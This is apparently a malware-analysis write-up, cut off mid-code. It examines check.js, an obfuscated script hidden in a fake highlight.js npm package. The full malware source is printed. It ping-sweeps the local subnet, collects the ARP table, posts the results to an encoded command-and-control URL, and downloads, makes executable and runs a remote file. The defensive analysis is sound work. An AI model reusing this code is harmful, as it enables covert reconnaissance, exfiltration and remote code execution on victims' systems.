&lt;p&gt;The json code descript : process called from C:\Users\User\AppData\Local\Volta\tools\image\node\22.14.0\node.exe C:\Users\User\Documents\workspaces\marktype\node_modules\@n37scancp\highlight.js\lib\check.js childScan&lt;/p&gt;
&lt;p&gt;reverse file check.js to understand tatics of attacker or you can track after scan arp the attacker used ping for many port from victim and open http to domainhostname : a96-7-128-209.deploy.static.akamaitechnologies.com
and destip : 96.7.128.209&lt;/p&gt;
&lt;p&gt;but I chosen the way two which reverse file check.js because it call processID : ping.exe and arp scan&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const uDOdzcLVrnBW$zxS = WoV$tBFijDNUIz;
(function(VtGSGO$egzKqhbdzX, UkXTniOk) {
    const pqzco_KFvLt = WoV$tBFijDNUIz
        , oOByfoMkNlbqnFB = VtGSGO$egzKqhbdzX();
    while (!![]) {
        try {
            const vIyHl = -parseFloat(pqzco_KFvLt(0x209)) / (-parseInt(0x1) * -0x1d9 + parseInt(0xffa) + -parseInt(0x11d2)) * (parseFloat(pqzco_KFvLt(0x20c)) / (Number(parseInt(0x23)) * parseInt(0x11) + Math.trunc(-parseInt(0x37d)) * -0x3 + parseInt(-0xcc8))) + parseInt(-parseFloat(pqzco_KFvLt(0x228)) / (parseInt(0x2) * -0x377 + -0x1357 * -parseInt(0x1) + Number(-parseInt(0x633)) * parseInt(0x2))) + parseFloat(-parseFloat(pqzco_KFvLt(0x1f8)) / (-parseInt(0x17cc) + parseFloat(parseInt(0x19a)) + parseInt(0x1636))) * parseInt(parseFloat(pqzco_KFvLt(0x23e)) / (parseInt(0x1c1) + Math.ceil(0xbad) + Math.floor(0x1) * Math.ceil(-0xd69))) + Math[&apos;floor&apos;](parseFloat(pqzco_KFvLt(0x1fe)) / (parseInt(0x1b94) + Math.floor(0x3) * -0x95f + parseInt(0x8f))) * (-parseFloat(pqzco_KFvLt(0x21c)) / (Math.ceil(parseInt(0x5)) * parseInt(-parseInt(0x434)) + parseFloat(parseInt(0x1573)) + -0x68)) + -parseFloat(pqzco_KFvLt(0x235)) / (Math.floor(-parseInt(0x26ad)) + Math.ceil(-parseInt(0x7db)) + Math.max(-0xa, -parseInt(0xa)) * -0x4a8) + -parseFloat(pqzco_KFvLt(0x215)) / (0xf * -parseInt(0x1) + -parseInt(0x17c5) + parseInt(parseInt(0x29)) * 0x95) * (-parseFloat(pqzco_KFvLt(0x240)) / (parseFloat(-0x1ae8) + parseInt(0xe52) + Math.trunc(0xca0))) + Number(parseFloat(pqzco_KFvLt(0x20a)) / (0x1c7f * -0x1 + Math.max(parseInt(0x169), parseInt(0x169)) + Math.floor(parseInt(0x1b21)))) * Math[&apos;floor&apos;](parseFloat(pqzco_KFvLt(0x22d)) / (-parseInt(0x87) * -0x18 + Math.floor(parseInt(0x1)) * -parseInt(0x2f8) + 0x1 * Number(-parseInt(0x9a4))));
            if (vIyHl === UkXTniOk) break;
            else oOByfoMkNlbqnFB[&apos;push&apos;](oOByfoMkNlbqnFB[&apos;shift&apos;]());
        } catch (a$PYsRhhF) {
            oOByfoMkNlbqnFB[&apos;push&apos;](oOByfoMkNlbqnFB[&apos;shift&apos;]());
        }
    }
}(FCFysguDoCPBlt$j_rW, -parseInt(0x2) * parseInt(0xab223) + -parseInt(0x1) * parseFloat(0x164afd) + Math.ceil(0x3867c4)));

function FCFysguDoCPBlt$j_rW() {
    const kE$QV$Zlc = [&apos;878c898b80b79d8a87&apos;, &apos;8a8b8c9194&apos;, &apos;89819797858381&apos;, &apos;8d838a8b9681&apos;, &apos;8d8a9081968a8588&apos;, &apos;928588918197&apos;, &apos;dcd5a6bc969e9189&apos;, &apos;94888590828b9689&apos;, &apos;96819488858781&apos;, &apos;c4c4a9a5a7dec4&apos;, &apos;07665d076649076747076757014b5a0c554507676907676707676c07674b07675807664bdec4&apos;, &apos;898d8a&apos;, &apos;898590878c&apos;, &apos;d5d3d18797b7a08888&apos;, &apos;9794888d90&apos;, &apos;d5d4ca&apos;, &apos;858888&apos;, &apos;8c90909497decbcb89818385ca8a9ecb828d8881cbb7a08bd48da7a6b5c7d58daebd9db7a69cd1abbedd8a9d919ea1bc888ddd91afaeb6809295bdacc98a9195ae82d08680be968f8b&apos;, &apos;85968392&apos;, &apos;908ba88b938196a7859781&apos;, &apos;9790968d8a838d829d&apos;, &apos;b48d8a83c4908bc4&apos;, &apos;948d8a83c4c987c4d5c4c9b3c4d5c4&apos;, &apos;d5d6d3cad4cad4cad5&apos;, &apos;819c8187b485908c&apos;, &apos;d0dcd7d4d0d4d6b38b91a39c83&apos;, &apos;888b83&apos;, &apos;88818a83908c&apos;, &apos;859494888d8785908d8b8acb8e978b8a&apos;, &apos;9787858ac4858a80c497818a808196&apos;, &apos;d5d6a1b088a38081&apos;, &apos;0d6465005b45026c74016e7bc8c407665d07676207675807665b07665d07665707675807676dde&apos;, &apos;859694c4c985&apos;, &apos;a5b6b407665d0766490767470767570766760d726f01436f07657307655a07657dcacaca&apos;, &apos;0d6465005b4507664c07674d076758de&apos;, &apos;968180918781&apos;, &apos;07665d076649076747076757005c49dec4&apos;, &apos;938d8ad7d6&apos;, &apos;ddd6dddddcd4dca194b4b187ac&apos;, &apos;93968d9081a28d8881b79d8a87&apos;, &apos;948d8a83c4c98ac4d5c4c993c4d5d4d4d4c4&apos;, &apos;c482858d888180dec4&apos;, &apos;adb4dec4&apos;, &apos;8a8190938b968fad8a9081968285878197&apos;, &apos;908c818a&apos;, &apos;adb492d0&apos;, &apos;d5ddd6cad5d2dcca&apos;, &apos;d6d6d6d1d18b89b5b58a86&apos;, &apos;878c8d8880b787858a&apos;, &apos;d5d6ddd2d3d4bca9a2b2b7b0&apos;, &apos;8c909094decbcbddd2cad3cad5d6dccad6d4ddcb85948dcb818a80948b8d8a90&apos;, &apos;b4abb7b0&apos;, &apos;8285898d889d&apos;, &apos;888b8580a59090968d8691908197&apos;, &apos;908d908881&apos;, &apos;8196968b96&apos;, &apos;979085909197&apos;, &apos;918a968182&apos;, &apos;898587&apos;, &apos;898183858e97&apos;, &apos;93968d9081&apos;, &apos;ee07674907675807664f07674fadb4dec4&apos;, &apos;d5d4d7d2b4abaebeac94&apos;, &apos;07677f07665d07676ce9&apos;, &apos;9790808b9190&apos;, &apos;85808096819797&apos;, &apos;07677f07665d07676c&apos;, &apos;82968b89b1b6a8&apos;, &apos;d6d7d4d4d0d2aa938ba08a8e&apos;, &apos;8e8b8d8a&apos;, &apos;94968b87819797&apos;, &apos;9491978c&apos;, &apos;ee07665d076649076747076757014a68005e62dec4&apos;, &apos;878590878c&apos;, &apos;8081869183&apos;, &apos;878c8d8880bb94968b87819797&apos;, &apos;828b96a185878c&apos;, &apos;8a858981&apos;, &apos;979085969097b38d908c&apos;, &apos;d5d0d7b395b6a0bcad&apos;, &apos;d2d3d4ddd1d4d5d3b6a99db6b79c&apos;, &apos;02407801635e07657307657b07677f07665d07676cde&apos;, &apos;d2ddd3d0a0969481a7a6&apos;, &apos;808b938a888b8580a69182828196&apos;, &apos;819c8d90&apos;];
    FCFysguDoCPBlt$j_rW = function() {
        return kE$QV$Zlc;
    };
    return FCFysguDoCPBlt$j_rW();
}
const {
    File
} = require(uDOdzcLVrnBW$zxS(0x1f5)), fs = require(&apos;fs&apos;), {
    spawn
    , exec
} = require(uDOdzcLVrnBW$zxS(0x205)), os = require(&apos;os&apos;), process = require(uDOdzcLVrnBW$zxS(0x200));

function getLocalIpAndNetwork() {
    const vIMfkPFyeCaSdQa = uDOdzcLVrnBW$zxS
        , HnoiYBg_zpfyjlM = os[vIMfkPFyeCaSdQa(0x23a)]();
    let uoYfpfJusgUKYSglT = vIMfkPFyeCaSdQa(0x226);
    for (const ScmEyaNqSlPWllfIdmzJzaOV of Object[vIMfkPFyeCaSdQa(0x214)](HnoiYBg_zpfyjlM)) {
        for (const FHpmigJLnQERONkokBNlv of ScmEyaNqSlPWllfIdmzJzaOV) {
            if (FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x243)] === vIMfkPFyeCaSdQa(0x23c) &amp;amp;&amp;amp; !FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x213)]) {
                uoYfpfJusgUKYSglT = FHpmigJLnQERONkokBNlv[vIMfkPFyeCaSdQa(0x1fb)];
                break;
            }
        }
        if (uoYfpfJusgUKYSglT !== vIMfkPFyeCaSdQa(0x226)) break;
    }
    let rBKaogMXrBkpyTlcpKaV = Number(parseInt(0x19a)) * -0x17 + -0x1 * parseInt(0xc4f) + 0x17 * parseInt(0x223);
    if (uoYfpfJusgUKYSglT[vIMfkPFyeCaSdQa(0x208)](vIMfkPFyeCaSdQa(0x23d))) rBKaogMXrBkpyTlcpKaV = -parseInt(0x25b5) + -parseInt(0x22a6) + -0x4873 * parseInt(-0x1);
    else uoYfpfJusgUKYSglT[vIMfkPFyeCaSdQa(0x208)](vIMfkPFyeCaSdQa(0x21e)) ? rBKaogMXrBkpyTlcpKaV = -0x2 * Math.trunc(0x161) + Math.max(parseInt(0x2696), 0x2696) + Number(-parseInt(0x23c4)) : rBKaogMXrBkpyTlcpKaV = parseFloat(-0x148b) + Math.max(0x681, 0x681) + Number(0xe22);
    const A_i$fyG = uoYfpfJusgUKYSglT + &apos;/&apos; + rBKaogMXrBkpyTlcpKaV;
    return {
        &apos;localIp&apos;: uoYfpfJusgUKYSglT
        , &apos;network&apos;: A_i$fyG
    };
}

function ipToNumber(RZYFhVngWcbUaYJSAPKE) {
    const lFcU_PzHHdMVTBUB = uDOdzcLVrnBW$zxS;
    return RZYFhVngWcbUaYJSAPKE[lFcU_PzHHdMVTBUB(0x21d)](&apos;.&apos;)[lFcU_PzHHdMVTBUB(0x232)]((Fze_SYybip_oMfdmHOJrTLJpvr, pIFogwGMITZvRXUnlOrRA) =&amp;gt; (Fze_SYybip_oMfdmHOJrTLJpvr &amp;lt;&amp;lt; Math.floor(-0x930) + Number(0xeeb) * -0x2 + 0x270e) + parseInt(pIFogwGMITZvRXUnlOrRA, parseFloat(0x1) * -0x178d + Math.ceil(parseInt(0x16f)) * 0x14 + 0x515 * -0x1), -0x6d7 * -0x1 + Number(0x20dc) + -0x1 * Math.ceil(0x27b3));
}

function numberToIp(SV$qQrANuPlnejwaGXRTBATVl) {
    const KwwB_JOOg = uDOdzcLVrnBW$zxS;
    return [SV$qQrANuPlnejwaGXRTBATVl &amp;gt;&amp;gt;&amp;gt; -parseInt(0xd8d) * 0x2 + -parseInt(0x14b) + 0x1c7d &amp;amp; parseInt(0x2330) + parseInt(0x1587) + parseInt(0x2) * -parseInt(0x1bdc), SV$qQrANuPlnejwaGXRTBATVl &amp;gt;&amp;gt;&amp;gt; 0x1 * parseInt(-parseInt(0xdfd)) + -parseInt(0x23f7) + -parseInt(0x246) * -0x16 &amp;amp; -0x18cb * Math.max(parseInt(0x1), parseInt(0x1)) + 0x211d + Math.trunc(0xf) * -0x7d, SV$qQrANuPlnejwaGXRTBATVl &amp;gt;&amp;gt;&amp;gt; Math.ceil(-parseInt(0x1)) * 0x337 + parseFloat(parseInt(0x1358)) + -0x13d * 0xd &amp;amp; 0x3c8 + -0x1c59 + Math.trunc(parseInt(0x1990)), SV$qQrANuPlnejwaGXRTBATVl &amp;amp; -parseInt(0x651) + 0x2242 + parseInt(0x1af2) * -0x1][KwwB_JOOg(0x1ff)](&apos;.&apos;);
}

function getIpRange(OKOCTzojtA_QdwLjmsYvY) {
    const WwQqArharkPHCec$h_v = uDOdzcLVrnBW$zxS
        , [Lshaa$GSebLSrsCEm, AxnBehrJmeDCxzERo$_Bwlq] = OKOCTzojtA_QdwLjmsYvY[WwQqArharkPHCec$h_v(0x21d)](&apos;/&apos;)
        , skLPPJGkuROU$$bDdNePvOzqI = parseInt(AxnBehrJmeDCxzERo$_Bwlq, -parseInt(0x2538) + -0x380 + Number(-parseInt(0xd96)) * Math.floor(-0x3))
        , juyWkYFJzrPtGJVobyZ = ipToNumber(Lshaa$GSebLSrsCEm)
        , GRlaFNf$DsGBhcxGi$Vha = ~((-0x14b7 * Math.floor(-parseInt(0x1)) + -parseInt(0xa8a) * -0x3 + 0x44 * -parseInt(0xc5) &amp;lt;&amp;lt; Math.ceil(0x2684) + 0x651 + -parseInt(0x221) * parseInt(0x15) - skLPPJGkuROU$$bDdNePvOzqI) - (Math.floor(-0x7a0) + parseInt(0x1) * Math.trunc(-parseInt(0x1cd)) + parseInt(0x96e))) &amp;gt;&amp;gt;&amp;gt; parseInt(0x3) * parseInt(0x92d) + 0x85 + -0x1c0c
        , kS_MQZSbH = juyWkYFJzrPtGJVobyZ &amp;amp; GRlaFNf$DsGBhcxGi$Vha
        , KBrSWaO$zebouAwh = kS_MQZSbH | ~GRlaFNf$DsGBhcxGi$Vha &amp;gt;&amp;gt;&amp;gt; Math.trunc(parseInt(0x21e)) * Math.trunc(-0x4) + -0x974 + Number(0x11ec)
        , ISAyCDJjyUPGRYNZrAHrlJj$vg = [];
    for (let m$yAhR_QRKShl = kS_MQZSbH + (Math.floor(parseInt(0x1c07)) + Math.floor(-0x227a) + Math.max(0x674, 0x674)); m$yAhR_QRKShl &amp;lt; KBrSWaO$zebouAwh; m$yAhR_QRKShl++) {
        ISAyCDJjyUPGRYNZrAHrlJj$vg[WwQqArharkPHCec$h_v(0x201)](numberToIp(m$yAhR_QRKShl));
    }
    return ISAyCDJjyUPGRYNZrAHrlJj$vg;
}

function WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX) {
    const t_zkek_TJFQ = FCFysguDoCPBlt$j_rW();
    return WoV$tBFijDNUIz = function(WUdwGkzbEVBepUzvjiwbh, NlmzZnWkXOvaQF$$Y) {
        WUdwGkzbEVBepUzvjiwbh = WUdwGkzbEVBepUzvjiwbh - (0x1 * Math.floor(0xec1) + 0x1 * parseInt(parseInt(0x7e1)) + Math.trunc(-0x14b0));
        let DBqcUC_bGhwXNTn$jWHczQ = t_zkek_TJFQ[WUdwGkzbEVBepUzvjiwbh];
        if (WoV$tBFijDNUIz[&apos;Qluqqr&apos;] === undefined) {
            const LlTSrs__UZEexQjyvC = function(uydCEioFPKSAHCrsEM) {
                let xutO_S_dxEdfdSdk = -0x25 * parseInt(-parseInt(0x1d)) + 0x16b9 + -parseInt(0x1a06) &amp;amp; Math.ceil(-0x1128) + parseInt(0x6) * parseInt(0x562) + -parseInt(0xe25)
                    , s$GvwrdW = new Uint8Array(uydCEioFPKSAHCrsEM[&apos;match&apos;](/.{1,2}/g)[&apos;map&apos;](rjxrzgQ =&amp;gt; parseInt(rjxrzgQ, parseFloat(0x31) * 0x43 + -parseInt(0x19) * parseInt(0xd) + Number(parseInt(0xb7e)) * parseInt(-0x1))))
                    , vzb_$nN = s$GvwrdW[&apos;map&apos;](Monq$_AtE =&amp;gt; Monq$_AtE ^ xutO_S_dxEdfdSdk)
                    , PIELHsxTQxjtFL = new TextDecoder()
                    , S_HSGp$ObSwKZaV = PIELHsxTQxjtFL[&apos;decode&apos;](vzb_$nN);
                return S_HSGp$ObSwKZaV;
            };
            WoV$tBFijDNUIz[&apos;BYhUJP&apos;] = LlTSrs__UZEexQjyvC, dL$XnoyZBnknlhIiCmEzwmu = arguments, WoV$tBFijDNUIz[&apos;Qluqqr&apos;] = !![];
        }
        const qJIkgkxMUzlBjHd$PwhC = t_zkek_TJFQ[-parseInt(0x2) * Number(-0xdf3) + 0xeb2 + -0xbc * 0x3a]
            , mdif$q$Gv = WUdwGkzbEVBepUzvjiwbh + qJIkgkxMUzlBjHd$PwhC
            , dhW$ZTbNgbxwvUdYrNwNVOaHe = dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv];
        return !dhW$ZTbNgbxwvUdYrNwNVOaHe ? (WoV$tBFijDNUIz[&apos;rzVaPm&apos;] === undefined &amp;amp;&amp;amp; (WoV$tBFijDNUIz[&apos;rzVaPm&apos;] = !![]), DBqcUC_bGhwXNTn$jWHczQ = WoV$tBFijDNUIz[&apos;BYhUJP&apos;](DBqcUC_bGhwXNTn$jWHczQ), dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv] = DBqcUC_bGhwXNTn$jWHczQ) : DBqcUC_bGhwXNTn$jWHczQ = dhW$ZTbNgbxwvUdYrNwNVOaHe, DBqcUC_bGhwXNTn$jWHczQ;
    }, WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX);
}

function pingHost(QIjVxZBvsYDMpENrMJgTQtg) {
    return new Promise(pbLenJAfvOOjOiN =&amp;gt; {
        const Yhg$esdViak$fLVHlNIWNli = WoV$tBFijDNUIz
            , kqJIEFSTYZ_$M = process[Yhg$esdViak$fLVHlNIWNli(0x216)];
        let DhFbLOiURXUC = &apos;&apos;;
        kqJIEFSTYZ_$M === Yhg$esdViak$fLVHlNIWNli(0x234) ? DhFbLOiURXUC = Yhg$esdViak$fLVHlNIWNli(0x237) + QIjVxZBvsYDMpENrMJgTQtg : DhFbLOiURXUC = Yhg$esdViak$fLVHlNIWNli(0x225) + QIjVxZBvsYDMpENrMJgTQtg, exec(DhFbLOiURXUC, (MkQAHaYWgVUHH_NGZEeCkxW, eQ$uZASy, zxgXB_TP) =&amp;gt; {
            const oA_OXLSsGVrxnGExLNuOpkCttf = Yhg$esdViak$fLVHlNIWNli;
            MkQAHaYWgVUHH_NGZEeCkxW &amp;amp;&amp;amp; console[oA_OXLSsGVrxnGExLNuOpkCttf(0x204)](oA_OXLSsGVrxnGExLNuOpkCttf(0x224) + QIjVxZBvsYDMpENrMJgTQtg + oA_OXLSsGVrxnGExLNuOpkCttf(0x238) + MkQAHaYWgVUHH_NGZEeCkxW[oA_OXLSsGVrxnGExLNuOpkCttf(0x211)]), pbLenJAfvOOjOiN();
        });
    });
}

function getArpTable() {
    return new Promise((XqUfh, qOYGNEwMgsKGPdorxPTp$yQWDN) =&amp;gt; {
        const bmrgjbJyEQ_RQ = WoV$tBFijDNUIz;
        exec(bmrgjbJyEQ_RQ(0x22f), (B$lqvkXpTANFvXjz$Wti, Sw_PoEHhWkd, G_qiqOCvzsMP_KHig) =&amp;gt; {
            if (B$lqvkXpTANFvXjz$Wti) return qOYGNEwMgsKGPdorxPTp$yQWDN(B$lqvkXpTANFvXjz$Wti);
            const URQASHbgFrXwvfpDb_lq$WVq = parseArpOutput(Sw_PoEHhWkd);
            XqUfh(URQASHbgFrXwvfpDb_lq$WVq);
        });
    });
}

function parseArpOutput(kEy$vcx_WtNQYXcxo) {
    const AuTKBH$Tmfi = uDOdzcLVrnBW$zxS
        , Y$GNV$vwzbMLyVUFhVXTk = kEy$vcx_WtNQYXcxo[AuTKBH$Tmfi(0x21d)](&apos;\x0a&apos;)
        , hCxsJ_spDQFlHfIR$iTyFgJd = [];
    for (const vFOhm_pkR_HitHvB of Y$GNV$vwzbMLyVUFhVXTk) {
        let jSgypQR$lX = null;
        if (process[AuTKBH$Tmfi(0x216)] === AuTKBH$Tmfi(0x234)) {
            jSgypQR$lX = vFOhm_pkR_HitHvB[AuTKBH$Tmfi(0x21b)](/(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F-]+)/);
            if (jSgypQR$lX) {
                const gNlVljxrqH$$SmfBir = jSgypQR$lX[-0x226c + 0x226e + -parseInt(0x1)]
                    , LeqP$H_EpszHzME = jSgypQR$lX[Math.max(0x4, parseInt(0x4)) * Math.trunc(-parseInt(0x114)) + 0x18 * Math.floor(0xf7) + Number(-0x12d6)][AuTKBH$Tmfi(0x217)](/-/g, &apos;:&apos;)[AuTKBH$Tmfi(0x222)]();
                hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x201)]({
                    &apos;ip&apos;: gNlVljxrqH$$SmfBir
                    , &apos;mac&apos;: LeqP$H_EpszHzME
                });
            }
        } else {
            jSgypQR$lX = vFOhm_pkR_HitHvB[AuTKBH$Tmfi(0x21b)](/\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-fA-F:]+)/);
            if (jSgypQR$lX) {
                const dXJQS = jSgypQR$lX[parseInt(0x836) + Math.max(parseInt(0x5), 0x5) * parseInt(0x362) + Math.max(0x3b, parseInt(0x3b)) * -parseInt(0x6d)]
                    , ZXOKPdIR = jSgypQR$lX[-0x25a4 + parseFloat(0x202f) + 0x577][AuTKBH$Tmfi(0x222)]();
                hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x201)]({
                    &apos;ip&apos;: dXJQS
                    , &apos;mac&apos;: ZXOKPdIR
                });
            }
        }
    }
    return hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x22a)] &amp;gt; -0x1d97 + -parseInt(0x3) * -0x805 + parseInt(0x588) &amp;amp;&amp;amp; (console[AuTKBH$Tmfi(0x229)](AuTKBH$Tmfi(0x20b)), hCxsJ_spDQFlHfIR$iTyFgJd[AuTKBH$Tmfi(0x206)](B$$GHWjM =&amp;gt; {
        const jGKWOyjbpksQvbdrwMiHY = AuTKBH$Tmfi;
        console[jGKWOyjbpksQvbdrwMiHY(0x229)](jGKWOyjbpksQvbdrwMiHY(0x239) + B$$GHWjM[&apos;ip&apos;] + jGKWOyjbpksQvbdrwMiHY(0x218) + B$$GHWjM[jGKWOyjbpksQvbdrwMiHY(0x1f4)]);
    })), hCxsJ_spDQFlHfIR$iTyFgJd;
}
async function arpScan(PRNOXxYGxMUBjDcLuauGxiICX) {
    const GaREO$HGHSQf = uDOdzcLVrnBW$zxS;
    console[GaREO$HGHSQf(0x229)](GaREO$HGHSQf(0x230));
    let UJErS$yNxzFl = 0x1 * Number(0x2e9) + Math.floor(0x41a) + -parseInt(0x1) * parseInt(0x703);
    const Z$Smftd = PRNOXxYGxMUBjDcLuauGxiICX[GaREO$HGHSQf(0x22a)]
        , DGTmLzroPxjYfnTIVJ_x = 0x2 * parseInt(0x12dd) + -parseInt(0x9cb) + Math.ceil(parseInt(0x3)) * -parseInt(0x949);
    async function FNqybBmO(EzQbHadWKZ) {
        const RJjacHnh$bAvGggjAShOu$g = GaREO$HGHSQf
            , G_hKvvRcCRe = [];
        for (let TzOaTDA$_HMYICKRAjWThvdeNZ = EzQbHadWKZ; TzOaTDA$_HMYICKRAjWThvdeNZ &amp;lt; Math[RJjacHnh$bAvGggjAShOu$g(0x21a)](EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x, Z$Smftd); TzOaTDA$_HMYICKRAjWThvdeNZ++) {
            G_hKvvRcCRe[RJjacHnh$bAvGggjAShOu$g(0x201)](pingHost(PRNOXxYGxMUBjDcLuauGxiICX[TzOaTDA$_HMYICKRAjWThvdeNZ])[RJjacHnh$bAvGggjAShOu$g(0x23b)](() =&amp;gt; {
                const DKZQnDFzNRLnB = RJjacHnh$bAvGggjAShOu$g;
                UJErS$yNxzFl++, process[DKZQnDFzNRLnB(0x1fa)][DKZQnDFzNRLnB(0x1f6)](DKZQnDFzNRLnB(0x233) + UJErS$yNxzFl + &apos;/&apos; + Z$Smftd + DKZQnDFzNRLnB(0x1f9));
            }));
        }
        await Promise[RJjacHnh$bAvGggjAShOu$g(0x21f)](G_hKvvRcCRe), EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x &amp;lt; Z$Smftd &amp;amp;&amp;amp; await FNqybBmO(EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x);
    }
    await FNqybBmO(-parseInt(0x381) + -0x2 * Math.floor(-parseInt(0x541)) + parseInt(0x1) * -parseInt(0x701)), console[GaREO$HGHSQf(0x229)](GaREO$HGHSQf(0x202) + UJErS$yNxzFl + GaREO$HGHSQf(0x1fc));
    const VaBkLKjbdHRA$_hrvsMMIg = await getArpTable();
    return VaBkLKjbdHRA$_hrvsMMIg;
}
async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = TliGZFCRr$f_lF(0x241)
        , QkGLuwfbXPZgPCQrDgJeP = {
            &apos;scanned_hosts&apos;: rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            &apos;method&apos;: TliGZFCRr$f_lF(0x242)
            , &apos;headers&apos;: {
                &apos;Content-Type&apos;: TliGZFCRr$f_lF(0x22b)
            }
            , &apos;body&apos;: JSON[TliGZFCRr$f_lF(0x223)](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[TliGZFCRr$f_lF(0x229)](TliGZFCRr$f_lF(0x22e), BKcEwFtyvecUTnu[TliGZFCRr$f_lF(0x1f2)]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[TliGZFCRr$f_lF(0x229)](TliGZFCRr$f_lF(0x231), TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}
async function scan() {
    const ZqRrS = uDOdzcLVrnBW$zxS
        , {
            localIp: gAPjVFOIen_HhaSXFgjQN
            , network: TDOhqeWjPGtyZLhu
        } = getLocalIpAndNetwork();
    console[ZqRrS(0x229)](ZqRrS(0x1f7) + gAPjVFOIen_HhaSXFgjQN), console[ZqRrS(0x229)](ZqRrS(0x219) + TDOhqeWjPGtyZLhu);
    const ZhUTstpIiCGdQOiVOaUPlXm = getIpRange(TDOhqeWjPGtyZLhu)
        , XwQHSggiZmEWlfRTQKXzuedsD = await arpScan(ZhUTstpIiCGdQOiVOaUPlXm);
    XwQHSggiZmEWlfRTQKXzuedsD &amp;amp;&amp;amp; XwQHSggiZmEWlfRTQKXzuedsD[ZqRrS(0x22a)] &amp;gt; parseInt(0x1) * -parseInt(0x153d) + -parseInt(0x221c) + -0x3 * Math.ceil(-parseInt(0x1273)) &amp;amp;&amp;amp; await sendResults(XwQHSggiZmEWlfRTQKXzuedsD);
}
if (process[uDOdzcLVrnBW$zxS(0x221)][-0x1 * 0x23c1 + -parseInt(0x685) * -parseInt(0x2) + parseInt(0x16b9)] === uDOdzcLVrnBW$zxS(0x23f))(async function run() {
    const YUJkQsyRox = uDOdzcLVrnBW$zxS;
    process[YUJkQsyRox(0x245)] = YUJkQsyRox(0x22c), await scan(), setInterval(scan, 0xcfbe + parseInt(0xa1d7) * Math.ceil(-parseInt(0x4)) + Number(0x476be));
}());
else {
    const childScan = spawn(process[uDOdzcLVrnBW$zxS(0x227)], [__filename, uDOdzcLVrnBW$zxS(0x23f)], {
        &apos;detached&apos;: !![]
        , &apos;stdio&apos;: uDOdzcLVrnBW$zxS(0x212)
    });
    childScan[uDOdzcLVrnBW$zxS(0x1f3)]();
    const file = File[uDOdzcLVrnBW$zxS(0x1fd)](uDOdzcLVrnBW$zxS(0x220));
    file[uDOdzcLVrnBW$zxS(0x244)]()[uDOdzcLVrnBW$zxS(0x23b)](() =&amp;gt; file[uDOdzcLVrnBW$zxS(0x20d)]())[uDOdzcLVrnBW$zxS(0x23b)](XjtazzaPgAN$GEzRdONaVFdwO =&amp;gt; {
        const BunwlEZOV$ZQBObpRam_trGEW = uDOdzcLVrnBW$zxS;
        fs[BunwlEZOV$ZQBObpRam_trGEW(0x236)](file[BunwlEZOV$ZQBObpRam_trGEW(0x207)], XjtazzaPgAN$GEzRdONaVFdwO), fs[BunwlEZOV$ZQBObpRam_trGEW(0x20f)](file[BunwlEZOV$ZQBObpRam_trGEW(0x207)], Math.trunc(0x1) * -parseInt(0x12a7) + Math.trunc(-parseInt(0x827)) + Math.ceil(0x1cbb) * parseInt(0x1));
        const NLRMcwVnSwNd$$z = spawn(BunwlEZOV$ZQBObpRam_trGEW(0x210), [&apos;./&apos; + file[BunwlEZOV$ZQBObpRam_trGEW(0x207)]], {
            &apos;detached&apos;: !![]
            , &apos;stdio&apos;: BunwlEZOV$ZQBObpRam_trGEW(0x212)
        });
        NLRMcwVnSwNd$$z[BunwlEZOV$ZQBObpRam_trGEW(0x1f3)](), process[BunwlEZOV$ZQBObpRam_trGEW(0x20e)](-parseInt(0x269) * Math.trunc(parseInt(0x1)) + 0x18e0 * Number(0x1) + Number(parseInt(0x3)) * -0x77d);
    })[uDOdzcLVrnBW$zxS(0x203)](SVxEQGDSDghoLvdjRkV =&amp;gt; {
        const hfsaTsEKJKzeP = uDOdzcLVrnBW$zxS;
        console[hfsaTsEKJKzeP(0x246)](SVxEQGDSDghoLvdjRkV), process[hfsaTsEKJKzeP(0x20e)](parseFloat(-parseInt(0xbb)) * Math.floor(0x25) + parseInt(-0x1dcf) * -parseInt(0x1) + -0x2c7);
    });
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Summary Reverse Engineering check.js&lt;/h3&gt;
&lt;p&gt;I focused on the sendResults function, which contains the C2 (Command and Control) logic used to exfiltrate local IP addresses from the victim’s network to the attacker&apos;s server.
Here is code js to print connect request&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const uDOdzcLVrnBW$zxS = WoV$tBFijDNUIz;
(function(VtGSGO$egzKqhbdzX, UkXTniOk) {
    const pqzco_KFvLt = WoV$tBFijDNUIz
        , oOByfoMkNlbqnFB = VtGSGO$egzKqhbdzX();
    while (!![]) {
        try {
